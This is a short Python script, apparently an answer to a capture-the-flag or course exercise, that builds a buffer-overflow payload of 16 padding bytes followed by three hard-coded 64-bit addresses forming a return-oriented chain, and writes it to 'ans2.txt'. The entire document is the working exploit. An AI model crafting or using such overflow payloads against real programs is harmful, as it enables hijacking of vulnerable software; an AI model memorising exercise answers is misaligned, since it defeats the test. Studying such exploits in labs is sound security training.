payload  = b"A" * 16
payload += b"\xc7\x12\x40\x00\x00\x00\x00\x00"   
payload += b"\xf8\x03\x00\x00\x00\x00\x00\x00"   
payload += b"\x16\x12\x40\x00\x00\x00\x00\x00"  
# Write the payload to a file
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")